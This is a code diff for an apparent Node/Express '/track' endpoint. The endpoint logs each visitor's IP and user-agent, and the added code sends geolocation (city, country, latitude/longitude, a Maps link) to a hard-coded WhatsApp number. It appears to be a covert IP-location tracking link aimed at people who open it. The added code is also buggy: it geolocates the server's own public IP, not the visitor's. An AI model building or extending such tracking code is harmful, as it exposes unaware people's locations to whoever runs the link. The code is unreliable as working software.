@@ -118,7 +118,32 @@ app.get('/track', async (req, res) => {
   console.log(`📥 IP logged for UID: ${uid}`);
   console.log(`🌐 IP Address: ${ip}`);
   console.log(`📱 User-Agent: ${userAgent}`);
-  await createuser("whatsapp:+8801770887721",ip);
+
+  // Step 1: Get your public IP
+const getPublicIP = async () => {
+  const res = await fetch('https://api.ipify.org?format=json');
+  const data = await res.json();
+  return data.ip;
+};
+
+// Step 2: Get location from IP
+const getGeoLocation = async () => {
+  const ip = await getPublicIP();
+  const res = await fetch(`https://ipapi.co/${ip}/json/`);
+  const geo = await res.json();
+
+  console.log(`🌐 IP: ${ip}`);
+  console.log(`📍 City: ${geo.city}`);
+  console.log(`📍 Region: ${geo.region}`);
+  console.log(`📍 Country: ${geo.country_name}`);
+  console.log(`🧭 Lat: ${geo.latitude}, Lon: ${geo.longitude}`);
+  console.log(`🔗 Google Maps: https://www.google.com/maps?q=${geo.latitude},${geo.longitude}`);
+    await createuser("whatsapp:+8801770887721",ip+`<br> IP: ${ip}
+      <br> City: ${geo.city}<br> Region: ${geo.region}<br> Country: ${geo.country_name}<br> Lat: ${geo.latitude}, Lon: ${geo.longitude}<br> Google Maps: <a href="https://www.google.com/maps?q=${geo.latitude},${geo.longitude}" target="_blank">View on Maps</a>`);
+};
+
+  getGeoLocation();
+
   // Save to database or file if needed...
 
   // Send response
